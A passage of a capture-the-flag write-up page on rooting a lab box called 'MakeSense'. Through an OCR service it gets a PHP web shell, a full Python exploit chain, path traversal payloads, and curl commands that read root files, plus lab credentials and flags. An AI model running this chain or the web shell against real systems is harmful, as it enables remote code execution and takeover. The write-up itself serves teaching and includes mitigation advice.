+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>ssh walter@makesense.htb   # password: JbhHDAEgXvri3!
+</code></pre></div>
+<p><code>walter</code> has no <code>sudo</code> rights (<code>sudo -l</code> → "may not run sudo on makesense") and is not in
+any extra groups. <code>/home/admin</code> is not readable by walter.</p>
+<p><strong>User flag:</strong> <code>/home/walter/user.txt</code> → <code>b0d9b988398ef8ab93131175d1086459</code></p>
+<hr />
+<h2 id="privilege-escalation">Privilege escalation</h2>
+<h3 id="internal-service-discovery-from-walter-ssh">Internal service discovery (from walter SSH)</h3>
+<p>Port 8001 was filtered externally but is <strong>listening on 127.0.0.1</strong> — it's a PHP built-in
+development server running as <strong>root</strong> (PID 1395):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># From walter&#39;s SSH session</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>curl<span class="w"> </span>-s<span class="w"> </span>http://walter:JbhHDAEgXvri3%21@127.0.0.1:8001/
+</code></pre></div>
+<p>The service is an <strong>OCR drawing application</strong> ("MakeSense") — draw on a canvas, submit via
+POST (<code>canvas_image</code> as base64 PNG data URL), returns recognized text. It's protected by
+<strong>HTTP Basic Auth</strong> — and the credentials are <strong>reused</strong> from wp-config.php
+(<code>walter:JbhHDAEgXvri3!</code>).</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="x">php -S 127.0.0.1:8001 -t /root/ocr4/</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="x">#                          ^^^^^^^^^^^— contents not readable by walter (0700 root)</span>
+</code></pre></div>
+<h3 id="the-admin-user-prey-automation">The <code>admin</code> user &amp; prey automation</h3>
+<p>The box has a second user <code>admin</code> (uid 1001) that runs a Python Selenium automation script:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>admin<span class="w">  </span>/bin/sh<span class="w"> </span>-c<span class="w"> </span><span class="nv">PREY_BASE_URL</span><span class="o">=</span>https://makesense.htb<span class="w"> </span><span class="nv">PREY_HEADLESS</span><span class="o">=</span><span class="nb">true</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="w">         </span>/usr/bin/python3<span class="w"> </span>/home/admin/.process/prey-unified.py<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">         </span>&gt;&gt;<span class="w"> </span>/home/admin/automation.log<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre></div>
+<p>This script starts Chrome <strong>headless</strong> (<code>--headless=new --no-sandbox</code>) with a random
+<code>--remote-debugging-port=0</code>, making the <strong>Chrome DevTools port</strong> and <strong>chromedriver port</strong>
+available on 127.0.0.1 ephemerally. The script runs periodically (~every 60-120 seconds)
+and its home directory (<code>/home/admin/</code>) is not readable by <code>walter</code>.</p>
+<h3 id="attack-path-in-progress">Attack path in progress</h3>
+<p>The intended root escalation likely involves:</p>
+<ol>
+<li>
+<p><strong>Chrome DevTools hijack:</strong> When <code>prey-unified.py</code> starts Chrome, ephemeral ports appear
+   on lo (<code>127.0.0.1:XXXXX</code>). Via SSH port-forwarding, an attacker can connect to the
+   Chrome DevTools Protocol and navigate the browser to internal services.</p>
+</li>
+<li>
+<p><strong>OCR service (root) via browser:</strong> The OCR service on port 8001 runs as root and requires
+   Basic Auth as <code>walter</code>. The <code>admin</code> user's Chrome could be made (via DevTools) to POST a
+   crafted image to the OCR service — exploiting a potential command injection, LFI, or
+   deserialization inside <code>/root/ocr4/index.php</code> to execute code as <strong>root</strong>.</p>
+</li>
+<li>
+<p><strong>Source code not readable:</strong> The <code>/root/ocr4/</code> directory is mode 0700 owned by root.
+   The PHP source (<code>index.php</code>) is only accessible through the built-in server.</p>
+</li>
+</ol>
+<h3 id="ocr-save-as-feature-arbitrary-file-write-candidate">OCR "Save as" feature — arbitrary file write candidate</h3>
+<p>The OCR app has a <strong>second form</strong> after a successful recognition:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span><span class="p">&gt;</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;ocr_id&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;ocr_6a4c079732df96.34471046&quot;</span><span class="p">&gt;</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;filename&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;result.txt&quot;</span> <span class="na">required</span><span class="p">&gt;</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>    <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;save_output&quot;</span><span class="p">&gt;</span>Save<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</code></pre></div>
+<p><code>POST /</code> with <code>ocr_id</code> + <code>filename</code> + <code>save_output=Save</code> writes the recognized text
+server-side (as <strong>root</strong>, since the PHP dev server itself runs as root) and replies
+<code>Saved as: saved/&lt;filename&gt;</code> — confirming a <code>saved/</code> subdirectory under the app root
+(<code>/root/ocr4/saved/</code>).</p>
+<p><strong>Session state matters:</strong> <code>ocr_id</code> is only resolvable within the <strong>same PHP session</strong>
+(<code>PHPSESSID</code> cookie) that generated it — a plain stateless <code>urllib.request</code> POST (no
+cookie jar) silently fails to find the id. Must use <code>requests.Session()</code> (or curl <code>-c/-b</code>)
+across the recognize → save round trip.</p>
+<p><strong>Path traversal attempts (all neutralised so far):</strong></p>
+<table>
+<thead>
+<tr>
+<th><code>filename</code> payload</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>../../../../tmp/x.txt</code> (any depth 1–6)</td>
+<td>saved as <code>saved/x.txt</code> — path stripped</td>
+</tr>
+<tr>
+<td><code>....//....//....//tmp/x.txt</code></td>
+<td>no notice / write not confirmed in <code>/tmp</code></td>
+</tr>
+<tr>
+<td><code>..%2f..%2f..%2ftmp%2fx.txt</code></td>
+<td>same</td>
+</tr>
+<tr>
+<td><code>..\..\..\tmp\x.txt</code></td>
+<td>same</td>
+</tr>
+<tr>
+<td><code>/tmp/x.txt</code> (absolute)</td>
+<td>same</td>
+</tr>
+<tr>
+<td><code>a/../../../../tmp/x.txt</code></td>
+<td>same</td>
+</tr>
+</tbody>
+</table>
+<p>Looks like <code>basename()</code> (or equivalent) is applied to <code>filename</code> before writing — classic
+slash-based traversal (including <code>....//</code>, URL-encoded, and backslash variants) is fully
+neutralized: every payload saved as <code>saved/&lt;basename-only&gt;</code>. Directory traversal was a
+dead end.</p>
+<p>Also tried: injecting a fake MIME <code>name=</code> parameter into the <code>canvas_image</code> data URI
+(<code>data:image/png;name=x\</code>cmd`.png;base64,...<code>) to see if the server shells out to an
+external OCR binary with an attacker-controlled temp filename — rejected outright
+(</code>Invalid image data.<code>). The data-URL parser only accepts a strict</code>data:image/(png|jpeg);base64,<payload><code>shape with real decodable image bytes; other
+MIME types (</code>svg+xml<code>,</code>gif<code>,</code>webp<code>,</code>bmp<code>,</code>pdf<code>,</code>tiff`) were also rejected.</p>
+<h3 id="root-the-save-as-feature-writes-straight-into-the-ocr-apps-own-webroot">Root — the "Save as" feature writes straight into the OCR app's own webroot</h3>
+<p>The key realization: <code>php -S 127.0.0.1:8001 -t /root/ocr4/</code> serves <strong><code>/root/ocr4/</code> itself</strong>
+as the HTTP document root, and <code>saved/</code> (where recognized output gets written) is a
+subdirectory <em>inside</em> that same docroot. Traversal wasn't needed at all — a file saved as
+<code>saved/&lt;name&gt;.php</code> is immediately reachable at <code>http://127.0.0.1:8001/saved/&lt;name&gt;.php</code>
+and PHP's built-in server <strong>executes it</strong>, running as <strong>root</strong>.</p>
+<p>The only requirement is that the OCR engine "read back" our PHP payload as text accurately
+enough to reproduce it byte-for-byte. Instead of hand-drawing on the canvas, a clean PNG
+of the payload was rendered with PIL/Pillow (bold monospace font) and submitted directly
+as the <code>canvas_image</code> data URL — the OCR engine transcribed it perfectly:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">PIL</span><span class="w"> </span><span class="kn">import</span> <span class="n">Image</span><span class="p">,</span> <span class="n">ImageDraw</span><span class="p">,</span> <span class="n">ImageFont</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;RGB&#39;</span><span class="p">,</span> <span class="p">(</span><span class="mi">900</span><span class="p">,</span> <span class="mi">200</span><span class="p">),</span> <span class="s1">&#39;white&#39;</span><span class="p">)</span>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="n">d</span> <span class="o">=</span> <span class="n">ImageDraw</span><span class="o">.</span><span class="n">Draw</span><span class="p">(</span><span class="n">img</span><span class="p">)</span>
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="n">font</span> <span class="o">=</span> <span class="n">ImageFont</span><span class="o">.</span><span class="n">truetype</span><span class="p">(</span><span class="s1">&#39;/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf&#39;</span><span class="p">,</span> <span class="mi">36</span><span class="p">)</span>
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="n">d</span><span class="o">.</span><span class="n">text</span><span class="p">((</span><span class="mi">20</span><span class="p">,</span> <span class="mi">70</span><span class="p">),</span> <span class="s1">&#39;&lt;?php system($_GET[&quot;c&quot;]); ?&gt;&#39;</span><span class="p">,</span> <span class="n">fill</span><span class="o">=</span><span class="s1">&#39;black&#39;</span><span class="p">,</span> <span class="n">font</span><span class="o">=</span><span class="n">font</span><span class="p">)</span>
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="n">img</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s1">&#39;shell_render.png&#39;</span><span class="p">)</span>
+</code></pre></div>
+<p>Full chain (recognize → save as <code>.php</code> → hit it), all within one <code>requests.Session</code> so the
+<code>PHPSESSID</code>-bound <code>ocr_id</code> stays valid:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span><span class="o">,</span><span class="w"> </span><span class="nn">base64</span><span class="o">,</span><span class="w"> </span><span class="nn">re</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">();</span> <span class="n">s</span><span class="o">.</span><span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;walter&#39;</span><span class="p">,</span> <span class="s1">&#39;JbhHDAEgXvri3!&#39;</span><span class="p">)</span>
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="n">BASE</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1:8001/&#39;</span>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="n">b64</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;shell_render.png&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">BASE</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;canvas_image&#39;</span><span class="p">:</span> <span class="s1">&#39;data:image/png;base64,&#39;</span> <span class="o">+</span> <span class="n">b64</span><span class="p">})</span>
+<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="n">ocr_id</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;name=&quot;ocr_id&quot; value=&quot;([^&quot;]*)&quot;&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>
+<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">BASE</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;ocr_id&#39;</span><span class="p">:</span> <span class="n">ocr_id</span><span class="p">,</span> <span class="s1">&#39;filename&#39;</span><span class="p">:</span> <span class="s1">&#39;shell.php&#39;</span><span class="p">,</span> <span class="s1">&#39;save_output&#39;</span><span class="p">:</span> <span class="s1">&#39;Save&#39;</span><span class="p">})</span>
+<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>
+<a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="n">r3</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="s1">&#39;saved/shell.php&#39;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;c&#39;</span><span class="p">:</span> <span class="s1">&#39;id&#39;</span><span class="p">})</span>
+<a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a><span class="nb">print</span><span class="p">(</span><span class="n">r3</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>   <span class="c1"># uid=0(root) gid=0(root) groups=0(root)</span>
+</code></pre></div>
+<p>Confirmed:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>$ curl -s -u &quot;walter:JbhHDAEgXvri3!&quot; &quot;http://127.0.0.1:8001/saved/shell.php?c=id&quot;
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div>
+<p><strong>Root flag:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>curl -s -u &quot;walter:JbhHDAEgXvri3!&quot; &quot;http://127.0.0.1:8001/saved/shell.php&quot; --data-urlencode &quot;c=cat /root/root.txt&quot; -G
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a># 1ba34db31b170bb0a085d541b508a4c0
+</code></pre></div>
+<p>The Chrome DevTools / <code>prey-unified.py</code> avenue documented above was a red herring for
+privesc — it's just the site's admin QA bot (its <code>login-failure.png</code> screenshot in <code>/tmp</code>,
+world-readable, shows it stuck on WordPress's "confirm admin email" screen, the same
+interstitial worked around in Step 4).</p>
+<hr />
+<h2 id="flag">Flag</h2>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Value</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>user</strong></td>
+<td><code>b0d9b988398ef8ab93131175d1086459</code></td>
+<td>✅</td>
+</tr>
+<tr>
+<td><strong>root</strong></td>
+<td><code>1ba34db31b170bb0a085d541b508a4c0</code></td>
+<td>✅</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="vulnerability">Vulnerability</h2>
+<p><strong>Foothold</strong></p>
+<ul>
+<li><strong>Type:</strong> Stored Cross-Site Scripting (XSS)</li>
+<li><strong>CWE:</strong> CWE-79</li>
+<li><strong>OWASP:</strong> A03:2021 (Injection)</li>
+</ul>
+<p><strong>Privilege escalation</strong></p>
+<ul>
+<li><strong>Type:</strong> Arbitrary PHP file write inside a web-accessible directory served by root's
+  PHP built-in dev server (OCR "save output" feature writes into its own docroot)</li>
+<li><strong>CWE:</strong> CWE-434 (Unrestricted Upload of File with Dangerous Type) / CWE-94 (Code Injection)</li>
+<li><strong>OWASP:</strong> A03:2021 (Injection)</li>
+</ul>
+<h2 id="mitigation">Mitigation</h2>
+<ul>
+<li>Encrypt then MAC (AES‑GCM is correct), but the key is <strong>hardcoded in client‑side JS</strong>.
+  The key should be per‑session or per‑user, never static.</li>
+<li>The decrypted transcription/summary must be HTML‑escaped before rendering in the admin
+  panel (<code>htmlspecialchars</code> / <code>esc_html</code>).</li>
+<li>WordPress admin session cookies should have <code>HttpOnly</code> flag (they do not appear in JS
+  exfil, confirming they are HttpOnly — the create‑user attack worked via same‑origin XHR).</li>
+<li>Never run <code>php -S</code> (or any dev server) as <strong>root</strong>, and never let a user-controlled
+  "save output" feature write into the same directory tree the server executes PHP from —
+  separate the writable/output directory from the docroot, whitelist output extensions
+  (e.g. <code>.txt</code> only), and don't trust <code>basename()</code> alone as the <em>only</em> safeguard when the
+  real risk is arbitrary <em>code</em> execution rather than path traversal.</li>
+<li>Reused passwords (<code>wp-config.php</code> DB creds == <code>walter</code>'s system password == OCR app's
+  Basic Auth) let a single leak cascade across three otherwise-unrelated services —
+  use distinct credentials per service.</li>
+</ul>
+<hr />
+<h2 id="timeline">Timeline</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>[1] nmap → [2] WordPress recon → [3] JS source analysis (encryption key) →
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>[4] solve.py (AES-GCM forge) → [5] XSS cookie exfil → [6] /p.js user creation payload →
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>[7] WordPress admin access → [8] theme-editor webshell injection (RCE as www-data) →
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>[9] wp-config.php DB creds → SSH as walter (pw reuse, user flag) →
+<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>[10] Internal service discovery (OCR on :8001 running as root, Basic Auth = walter&#39;s pw) →
+<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>[11] Path-traversal fuzzing on &quot;save output&quot; filename → dead end (basename() holds) →
+<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>[12] Realized saved/ is inside the OCR app&#39;s own docroot → OCR-render a PHP payload as an
+<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>     image, let OCR &quot;read&quot; it back, save as saved/shell.php → RCE as root → root flag
+</code></pre></div>
+<h2 id="tools-used">Tools used</h2>
+<ul>
+<li><code>nmap</code> 7.99</li>
+<li><code>curl</code></li>
+<li>Python 3 + <code>requests</code> + <code>pycryptodome</code> (AES-GCM) + <code>paramiko</code> (SSH) + <code>Pillow</code> (PIL, for
+  rendering the OCR payload image)</li>
+<li>WordPress admin panel</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../../cicada/cicada/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Cicada">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Cicada
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../../../challenges/pwn/r0bob1rd/" class="md-footer__link md-footer__link--next" aria-label="Next: R0bob1rd">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                R0bob1rd
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      &copy; 2026 <a href="https://github.com/krozfu"  target="_blank" rel="noopener">KrozFu</a>
+
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.linkedin.com/in/juan-carlos-charfuelan-caipe" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/krozfu" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M202.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M496 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.youtube.com/@krozfuhack" target="_blank" rel="noopener" title="www.youtube.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M549.7 124.1c-6.2-23.7-24.8-42.3-48.3-48.6C458.9 64 288.1 64 288.1 64S117.3 64 74.7 75.5c-23.5 6.3-42 24.9-48.3 48.6C15 167 15 256.4 15 256.4s0 89.4 11.4 132.3c6.3 23.6 24.8 41.5 48.3 47.8C117.3 448 288.1 448 288.1 448s170.8 0 213.4-11.5c23.5-6.3 42-24.2 48.3-47.8 11.4-42.9 11.4-132.3 11.4-132.3s0-89.4-11.4-132.3zM232.2 337.6V175.2l142.7 81.2z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://twitter.com/krozfu" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M459.4 151.7c.3 4.5.3 9.1.3 13.6 0 138.7-105.6 298.6-298.6 298.6-59.5 0-114.7-17.2-161.1-47.1 8.4 1 16.6 1.3 25.3 1.3 49.1 0 94.2-16.6 130.3-44.8-46.1-1-84.8-31.2-98.1-72.8 6.5 1 13 1.6 19.8 1.6 9.4 0 18.8-1.3 27.6-3.6-48.1-9.7-84.1-52-84.1-103v-1.3c14 7.8 30.2 12.7 47.4 13.3-28.3-18.8-46.8-51-46.8-87.4 0-19.5 5.2-37.4 14.3-53C87.4 130.8 165 172.4 252.1 176.9c-1.6-7.8-2.6-15.9-2.6-24C249.5 95.1 296.3 48 354.4 48c30.2 0 57.5 12.7 76.7 33.1 23.7-4.5 46.5-13.3 66.6-25.3-7.8 24.4-24.4 44.8-46.1 57.8 21.1-2.3 41.6-8.1 60.4-16.2-14.3 20.8-32.2 39.3-52.6 54.3"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.instagram.com/kr0zfu/" target="_blank" rel="noopener" title="www.instagram.com" class="md-social__link">
